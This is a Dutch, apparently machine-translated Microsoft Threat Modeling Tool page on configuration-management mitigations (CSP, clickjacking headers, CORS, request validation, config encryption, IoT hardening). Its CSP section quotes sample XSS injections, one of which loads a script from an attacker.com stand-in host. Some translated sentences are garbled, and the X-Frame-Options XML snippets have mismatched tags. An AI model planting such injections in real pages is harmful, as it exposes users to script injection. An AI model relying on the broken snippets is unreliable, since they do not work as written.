---
title: Configuratiebeheer voor de Microsoft Threat Modeling Tool
titleSuffix: Azure
description: oplossingen voor bedreigingen die worden blootgesteld in de Threat Modeling Tool
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: ead6a79109c221d31ead96a202e97294ef218c5f
ms.sourcegitcommit: acb82fc770128234f2e9222939826e3ade3a2a28
ms.translationtype: MT
ms.contentlocale: nl-NL
ms.lasthandoff: 04/21/2020
ms.locfileid: "81687980"
---
# <a name="security-frame-configuration-management--mitigations"></a>Beveiligingsframe: configuratiebeheer | Mitigaties 
| Product/service | Artikel |
| --------------- | ------- |
| **Webtoepassing** | <ul><li>[Inhoudsbeveiligingsbeleid (CSP) implementeren en javascript inline uitschakelen](#csp-js)</li><li>[XsS-filter van de browser inschakelen](#xss-filter)</li><li>[ASP.NET toepassingen moeten tracering en foutopsporing uitschakelen voordat ze worden geïmplementeerd](#trace-deploy)</li><li>[Alleen toegang tot javascripts van derden via vertrouwde bronnen](#js-trusted)</li><li>[Controleer of geverifieerde ASP.NET-pagina's ui-voor-uitwering of klik-jacking-verdedigingbevatten](#ui-defenses)</li><li>[Ervoor zorgen dat alleen vertrouwde oorsprong is toegestaan als CORS is ingeschakeld op ASP.NET webtoepassingen](#cors-aspnet)</li><li>[Kenmerk ValidateRequest inschakelen op ASP.NET pagina's](#validate-aspnet)</li><li>[Gebruik de nieuwste versies van JavaScript-bibliotheken die lokaal worden gehost](#local-js)</li><li>[Automatische MIME-snuiven uitschakelen](#mime-sniff)</li><li>[Standaardserverkoppen op Windows Azure-websites verwijderen om fingerprinting te voorkomen](#standard-finger)</li></ul> |
| **Database** | <ul><li>[Een Windows Firewall voor Database Engine Access configureren](#firewall-db)</li></ul> |
| **Web-API** | <ul><li>[Ervoor zorgen dat alleen vertrouwde oorsprong is toegestaan als CORS is ingeschakeld op ASP.NET Web API](#cors-api)</li><li>[Secties van de configuratiebestanden van web-API versleutelen die gevoelige gegevens bevatten](#config-sensitive)</li></ul> |
| **IoT-apparaat** | <ul><li>[Ervoor zorgen dat alle beheerinterfaces zijn beveiligd met sterke referenties](#admin-strong)</li><li>[Ervoor zorgen dat onbekende code niet kan worden uitgevoerd op apparaten](#unknown-exe)</li><li>[Besturingssysteem en extra partities van IoT-apparaat versleutelen met bit-locker](#partition-iot)</li><li>[Ervoor zorgen dat alleen de minimale services/functies zijn ingeschakeld op apparaten](#min-enable)</li></ul> |
| **IoT-veldgateway** | <ul><li>[Besturingssysteem en extra partities van IoT Field Gateway versleutelen met bit-locker](#field-bit-locker)</li><li>[Ervoor zorgen dat de standaardinloggegevens van de veldgateway tijdens de installatie worden gewijzigd](#default-change)</li></ul> |
| **IoT Cloud Gateway** | <ul><li>[Zorg ervoor dat de Cloud Gateway een proces implementeert om de firmware van verbonden apparaten up-to-date te houden](#cloud-firmware)</li></ul> |
| **Grens van machinevertrouwensrelatie** | <ul><li>[Ervoor zorgen dat apparaten eindpuntbeveiligingsbesturingselementen hebben geconfigureerd volgens organisatiebeleid](#controls-policies)</li></ul> |
| **Azure-opslag** | <ul><li>[Zorgen voor veilig beheer van Azure-opslagtoegangssleutels](#secure-keys)</li><li>[Ervoor zorgen dat alleen vertrouwde oorsprong is toegestaan als CORS is ingeschakeld op Azure-opslag](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[De functie servicebeperking van WCF inschakelen](#throttling)</li><li>[WCF-Informatie openbaarmaking door middel van metadata](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Inhoudsbeveiligingsbeleid (CSP) implementeren en javascript inline uitschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Een inleiding tot contentbeveiligingsbeleid,](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) [referentie van het inhoudsbeleid,](https://content-security-policy.com/) [beveiligingsfuncties](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [inleiding tot het inhoudsbeveiligingsbeleid](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [Kan ik CSP gebruiken?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Stappen** | <p>Content Security Policy (CSP) is een defensie-in-diepte beveiligingsmechanisme, een W3C-standaard, waarmee eigenaren van webapplicaties controle hebben over de inhoud die in hun site is ingebed. CSP wordt toegevoegd als een HTTP-antwoordkop op de webserver en wordt aan de clientzijde afgedwongen door browsers. Het is een op de whitelist gebaseerd beleid - een website kan een set vertrouwde domeinen declareren waaruit actieve inhoud zoals JavaScript kan worden geladen.</p><p>CSP biedt de volgende beveiligingsvoordelen:</p><ul><li>**Bescherming tegen XSS:** Als een pagina kwetsbaar is voor XSS, kan een aanvaller deze op twee manieren exploiteren:<ul><li>Injecteer `<script>malicious code</script>`. Deze exploit werkt niet als gevolg van CSP's Base Restriction-1</li><li>Injecteer `<script src="http://attacker.com/maliciousCode.js"/>`. Deze exploit werkt niet omdat het door de aanvaller gecontroleerde domein niet in de whitelist van CSP van domeinen zal staan</li></ul></li><li>**Controle over gegevensexfiltratie:** Als schadelijke inhoud op een webpagina probeert verbinding te maken met een externe website en gegevens te stelen, wordt de verbinding afgebroken door CSP. Dit komt omdat het doeldomein niet op de whitelist van CSP staat</li><li>**Verdediging tegen click-jacking:** click-jacking is een aanvalstechniek waarmee een tegenstander een echte website kan framen en gebruikers kan dwingen om op UI-elementen te klikken. Momenteel verdediging tegen click-jacking wordt bereikt door het configureren van een reactie header-X-Frame-Options. Niet alle browsers respecteren deze header en in de toekomst CSP zal een standaard manier om te verdedigen tegen click-jacking</li><li>**Real-time aanvalsrapportage:** Als er een injectieaanval is op een CSP-website, activeren browsers automatisch een melding naar een eindpunt dat is geconfigureerd op de webserver. Op deze manier fungeert CSP als een real-time waarschuwingssysteem.</li></ul> |

### <a name="example"></a>Voorbeeld
Voorbeeldbeleid: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Met dit beleid kunnen scripts alleen worden geladen vanaf de server van de webtoepassing en de Google Analytics-server. Scripts die vanaf een andere site worden geladen, worden geweigerd. Wanneer CSP is ingeschakeld op een website, worden de volgende functies automatisch uitgeschakeld om XSS-aanvallen te beperken. 

### <a name="example"></a>Voorbeeld
Inline-scripts worden niet uitgevoerd. Hieronder volgen voorbeelden van inline scripts 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Voorbeeld
Tekenreeksen worden niet als code geëvalueerd. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>XsS-filter van de browser inschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [XSS-beveiligingsfilter](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Stappen** | <p>X-XSS-Protection response header configuration controls the browser's cross site script filter. Met deze antwoordkop kunnen de volgende waarden worden gegeven:</p><ul><li>`0:`Hierdoor wordt het filter uitgeschakeld</li><li>`1: Filter enabled`Als een cross-site scripting aanval wordt gedetecteerd, om de aanval te stoppen, zal de browser ontsmetten van de pagina</li><li>`1: mode=block : Filter enabled`. In plaats van de pagina te ontsmetten, wordt de browser, wanneer een XSS-aanval wordt gedetecteerd, voorkomen dat de pagina wordt weergegeven</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. De browser ontsmet de pagina en rapporteert de overtreding.</li></ul><p>Dit is een Chromium-functie die gebruik maakt van CSP-schendingen om details naar een URI naar keuze te sturen. De laatste 2 opties worden beschouwd als veilige waarden.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET toepassingen moeten tracering en foutopsporing uitschakelen voordat ze worden geïmplementeerd

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [ASP.NET Overzicht van foutopsporing,](https://msdn.microsoft.com/library/ms227556.aspx) [ASP.NET traceeroverzicht](https://msdn.microsoft.com/library/bb386420.aspx), [Hoe: Tracering inschakelen voor een ASP.NET toepassing](https://msdn.microsoft.com/library/0x5wc973.aspx), [Hoe: Foutopsporing inschakelen voor ASP.NET toepassingen](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Stappen** | Wanneer tracering is ingeschakeld voor de pagina, verkrijgt elke browser die deze opvraagt ook de traceerinformatie die gegevens bevat over de interne serverstatus en -workflow. Die informatie kan gevoelig zijn voor beveiliging. Wanneer foutopsporing is ingeschakeld voor de pagina, resulteren fouten op de server in een volledige stack trace gegevens die aan de browser worden gepresenteerd. Die gegevens kunnen beveiligingsgevoelige informatie over de werkstroom van de server blootleggen. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Alleen toegang tot javascripts van derden via vertrouwde bronnen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | JavaScripts van derden mag alleen worden verwezen vanuit vertrouwde bronnen. De referentiepunten moeten altijd op SSL staan. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Controleer of geverifieerde ASP.NET-pagina's ui-voor-uitwering of klik-jacking-verdedigingbevatten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [OWASP click-jacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE Internals - Bestrijding van click-jacking met X-Frame-Opties](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Stappen** | <p>click-jacking, ook wel bekend als een "UI redress attack", is wanneer een aanvaller meerdere transparante of ondoorzichtige lagen gebruikt om een gebruiker te verleiden tot het klikken op een knop of link op een andere pagina toen ze van plan waren te klikken op de pagina op het hoogste niveau.</p><p>Deze gelaagdheid wordt bereikt door het maken van een kwaadaardige pagina met een iframe, die de pagina van het slachtoffer laadt. Dus, de aanvaller is "hijacking" klikken bedoeld voor hun pagina en routering ze naar een andere pagina, waarschijnlijk eigendom van een andere toepassing, domein, of beide. Als u aanvallen met klikjacking wilt voorkomen, stelt u de juiste HTTP-antwoordkoppen met X-Frame-Options in die de browser instrueren om framing uit andere domeinen niet toe te staan</p>|

### <a name="example"></a>Voorbeeld
De X-FRAME-OPTIONS header kan worden ingesteld via IIS web.config. Web.config code snippet voor sites die nooit mogen worden ingelijst: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Voorbeeld
Web.config-code voor sites die alleen moeten worden gekaderd door pagina's in hetzelfde domein: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Ervoor zorgen dat alleen vertrouwde oorsprong is toegestaan als CORS is ingeschakeld op ASP.NET webtoepassingen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Webformulieren, MVC5 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | <p>Browserbeveiliging voorkomt dat een webpagina AJAX-aanvragen indient bij een ander domein. Deze beperking wordt het beleid van dezelfde oorsprong genoemd en voorkomt dat een schadelijke site gevoelige gegevens van een andere site kan lezen. Soms kan het echter nodig zijn om API's veilig bloot te stellen welke andere sites kunnen verbruiken. Cross Origin Resource Sharing (CORS) is een W3C-standaard waarmee een server het beleid van dezelfde oorsprong kan versoepelen. Met CORS kan een server bepaalde cross-origine aanvragen expliciet toestaan terwijl andere worden afgewezen.</p><p>CORS is veiliger en flexibeler dan eerdere technieken zoals JSONP. In de kern, het inschakelen van CORS vertaalt naar het toevoegen van een paar HTTP-response headers (Access-Control-*) aan de webapplicatie en dit kan worden gedaan op een paar manieren.</p>|

### <a name="example"></a>Voorbeeld
Als toegang tot Web.config beschikbaar is, kan CORS worden toegevoegd via de volgende code: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Voorbeeld
Als toegang tot web.config niet beschikbaar is, kan CORS worden geconfigureerd door de volgende CSharp-code toe te voegen: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Houd er rekening mee dat het van cruciaal belang is om ervoor te zorgen dat de lijst met oorsprong in het kenmerk 'Access-Control-Allow-Origin' is ingesteld op een eindige en vertrouwde oorsprongsset. Als u dit niet op ongepaste wijze configureert (bijvoorbeeld door de waarde in te stellen als '*') kunnen kwaadwillende sites verzoeken om cross origin-aanvragen naar de webtoepassing te activeren >zonder beperkingen, waardoor de toepassing kwetsbaar is voor CSRF-aanvallen. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Kenmerk ValidateRequest inschakelen op ASP.NET pagina's

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Webformulieren, MVC5 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Validatie aanvragen - Scriptaanvallen voorkomen](https://www.asp.net/whitepapers/request-validation) |
| **Stappen** | <p>Vraag validatie aan, een functie van ASP.NET sinds versie 1.1, voorkomt dat de server inhoud accepteert die ongecodeerde HTML bevat. Deze functie is ontworpen om te helpen voorkomen dat sommige script-injectie aanvallen waarbij client script code of HTML kan onbewust worden ingediend op een server, opgeslagen, en vervolgens gepresenteerd aan andere gebruikers. We raden u nog steeds ten zeerste aan om alle invoergegevens te valideren en HTML deze waar nodig te coderen.</p><p>Aanvraagvalidatie wordt uitgevoerd door alle invoergegevens te vergelijken met een lijst met potentieel gevaarlijke waarden. Als er een overeenkomst `HttpRequestValidationException`plaatsvindt, verhoogt ASP.NET een . Standaard is de functie Validatie aanvragen ingeschakeld.</p>|

### <a name="example"></a>Voorbeeld
Deze functie kan echter op paginaniveau worden uitgeschakeld: 
```XML
<%@ Page validateRequest="false" %> 
```
of, op toepassingsniveau 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Houd er rekening mee dat de functie Validatie aanvragen niet wordt ondersteund en geen deel uitmaakt van de MVC6-pijplijn. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Gebruik de nieuwste versies van JavaScript-bibliotheken die lokaal worden gehost

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | <p>Ontwikkelaars die standaard JavaScript-bibliotheken zoals JQuery gebruiken, moeten goedgekeurde versies van veelvoorkomende JavaScript-bibliotheken gebruiken die geen bekende beveiligingsfouten bevatten. Een goede gewoonte is om de meest recente versie van de bibliotheken te gebruiken, omdat ze beveiligingsoplossingen bevatten voor bekende kwetsbaarheden in hun oudere versies.</p><p>Als de meest recente versie niet kan worden gebruikt vanwege compatibiliteitsredenen, moeten de onderstaande minimumversies worden gebruikt.</p><p>Acceptabele minimumversies:</p><ul><li>**Jquery**<ul><li>JQuery 1.7.1</li><li>JqueryUI 1.10.0</li><li>JQuery valideren 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery-cyclus 2.99</li><li>JQuery-gegevenstabellen 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET webformulieren en Ajax**<ul><li>ASP.NET Web Formulieren en Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Laad nooit een JavaScript-bibliotheek van externe sites zoals openbare CDN's</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Automatische MIME-snuiven uitschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [IE8-beveiligingsonderdeel V: uitgebreide beveiliging](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-type](https://en.wikipedia.org/wiki/Mime_type) |
| **Stappen** | De header X-Content-Type-Options is een HTTP-header waarmee ontwikkelaars kunnen opgeven dat hun inhoud niet mime-gesnoven mag worden. Deze header is ontworpen om MIME-Sniffing-aanvallen te beperken. Voor elke pagina die door de gebruiker controleerbare inhoud kan bevatten, moet u de HTTP-header X-Content-Type-Options:nosniff gebruiken. Als u de vereiste koptekst wereldwijd wilt inschakelen voor alle pagina's in de toepassing, u een van de volgende handelingen|

### <a name="example"></a>Voorbeeld
Voeg de koptekst toe in het web.config-bestand als de toepassing wordt gehost door Internet Information Services (IIS) 7 en verder. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Voorbeeld
De koptekst toevoegen\_via de algemene toepassing BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Voorbeeld
Aangepaste HTTP-module implementeren 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Voorbeeld
U de vereiste koptekst alleen inschakelen voor specifieke pagina's door deze toe te voegen aan afzonderlijke antwoorden: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Standaardserverkoppen op Windows Azure-websites verwijderen om fingerprinting te voorkomen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | EnvironmentType - Azure |
| **Verwijzingen**              | [Standaardserverkoppen verwijderen op Windows Azure-websites](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Stappen** | Kopteksten zoals Server, X-Powered-By, X-AspNet-Version onthullen informatie over de server en de onderliggende technologieën. Het wordt aanbevolen om deze headers te onderdrukken, waardoor fingerprinting van de toepassing wordt voorkomen |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Een Windows Firewall voor Database Engine Access configureren

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Database | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | SQL Azure, OnPrem |
| **Kenmerken**              | N/A, SQL-versie - V12 |
| **Verwijzingen**              | [Een Azure SQL-databasefirewall configureren](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Een Windows Firewall configureren voor Database Engine Access](https://msdn.microsoft.com/library/ms175043) |
| **Stappen** | Firewallsystemen helpen onbevoegde toegang tot computerresources te voorkomen. Als u via een firewall toegang wilt krijgen tot een instantie van de SQL Server Database Engine, moet u de firewall configureren op de computer waarop SQL Server wordt uitgevoerd om toegang te verlenen |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Ervoor zorgen dat alleen vertrouwde oorsprong is toegestaan als CORS is ingeschakeld op ASP.NET Web API

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Web-API | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | MVC 5 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Cross-Origin-aanvragen inschakelen in ASP.NET Web API 2,](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api) [ASP.NET Web API - CORS-ondersteuning in ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Stappen** | <p>Browserbeveiliging voorkomt dat een webpagina AJAX-aanvragen indient bij een ander domein. Deze beperking wordt het beleid van dezelfde oorsprong genoemd en voorkomt dat een schadelijke site gevoelige gegevens van een andere site kan lezen. Soms kan het echter nodig zijn om API's veilig bloot te stellen welke andere sites kunnen verbruiken. Cross Origin Resource Sharing (CORS) is een W3C-standaard waarmee een server het beleid van dezelfde oorsprong kan versoepelen.</p><p>Met CORS kan een server bepaalde cross-origine aanvragen expliciet toestaan terwijl andere worden afgewezen. CORS is veiliger en flexibeler dan eerdere technieken zoals JSONP.</p>|

### <a name="example"></a>Voorbeeld
Voeg in de App_Start/WebApiConfig.cs de volgende code toe aan de webapiconfig.register-methode 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Voorbeeld
Het kenmerk EnableCors kan als volgt worden toegepast op actiemethoden in een controller: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Houd er rekening mee dat het van cruciaal belang is ervoor te zorgen dat de lijst met oorsprong in het kenmerk EnableCors is ingesteld op een eindige en vertrouwde reeks oorsprongen. Als u dit niet op ongepaste wijze configureert (bijvoorbeeld door de waarde in te stellen als '*') kunnen kwaadwillende sites zonder beperkingen cross origin-aanvragen naar de API activeren, >waardoor de API kwetsbaar wordt voor CSRF-aanvallen. EnableCors kan worden ingericht op controllerniveau. 

### <a name="example"></a>Voorbeeld
Als u CORS wilt uitschakelen voor een bepaalde methode in een klasse, kan het kenmerk DisableCors worden gebruikt zoals hieronder wordt weergegeven: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Web-API | 
| **SDL-fase**               | Ontwikkelen |  
| **Toepasselijke technologieën** | MVC 6 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Cross-Origin Requests (CORS) inschakelen in ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Stappen** | <p>In ASP.NET Core 1.0 kan CORS worden ingeschakeld met middleware of met MVC. Bij het gebruik van MVC om CORS in te schakelen worden dezelfde CORS-services gebruikt, maar de CORS middleware niet.</p>|

**Aanpak-1** CorS inschakelen met middleware: CorS inschakelen voor de gehele toepassing voegt de CORS middleware toe aan de aanvraagpijplijn met behulp van de extensiemethode UseCors. Een cross-origin beleid kan worden opgegeven bij het toevoegen van de CORS middleware met behulp van de klasse CorsPolicyBuilder. Er zijn twee manieren om dit te doen:

### <a name="example"></a>Voorbeeld
De eerste is om UseCors te bellen met een lambda. De lambda neemt een CorsPolicyBuilder object: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Voorbeeld
De tweede is het definiëren van een of meer benoemde CORS-beleidsregels en het beleid op naam selecteren bij het uitvoeren van de looptijd. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Aanpak-2** CORS inschakelen in MVC: Ontwikkelaars kunnen MVC ook gebruiken om specifieke CORS per actie, per controller of wereldwijd toe te passen voor alle controllers.

### <a name="example"></a>Voorbeeld
Per actie: Als u een CORS-beleid voor een specifieke actie wilt opgeven, voegt u het kenmerk [EnableCors] toe aan de actie. Geef de beleidsnaam op. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Voorbeeld
Per controller: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Voorbeeld
Wereldwijd: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Houd er rekening mee dat het van cruciaal belang is ervoor te zorgen dat de lijst met oorsprong in het kenmerk EnableCors is ingesteld op een eindige en vertrouwde reeks oorsprongen. Als u dit niet op ongepaste wijze configureert (bijvoorbeeld door de waarde in te stellen als '*') kunnen kwaadwillende sites zonder beperkingen cross origin-aanvragen naar de API activeren, >waardoor de API kwetsbaar wordt voor CSRF-aanvallen. 

### <a name="example"></a>Voorbeeld
Als u CORS wilt uitschakelen voor een controller of actie, gebruikt u het kenmerk [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Secties van de configuratiebestanden van web-API versleutelen die gevoelige gegevens bevatten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Component**               | Web-API | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [How To: Configuratiesecties versleutelen in ASP.NET 2.0 met Behulp van DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [Een beveiligde configuratieprovider opgeven](https://msdn.microsoft.com/library/68ze1hb2.aspx), Azure Key Vault gebruiken om [toepassingsgeheimen te beschermen](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Stappen** | Configuratiebestanden zoals de Web.config, appsettings.json worden vaak gebruikt om gevoelige informatie vast te houden, waaronder gebruikersnamen, wachtwoorden, databaseverbindingstekenreeksen en versleutelingssleutels. Als u deze informatie niet beschermt, is uw toepassing kwetsbaar voor aanvallers of kwaadwillende gebruikers die gevoelige informatie verkrijgen, zoals namen van accountgebruikers en wachtwoorden, databasenamen en servernamen. Versleutel op basis van het implementatietype (azure/on-prem) de gevoelige secties van config-bestanden met DPAPI of services zoals Azure Key Vault. |

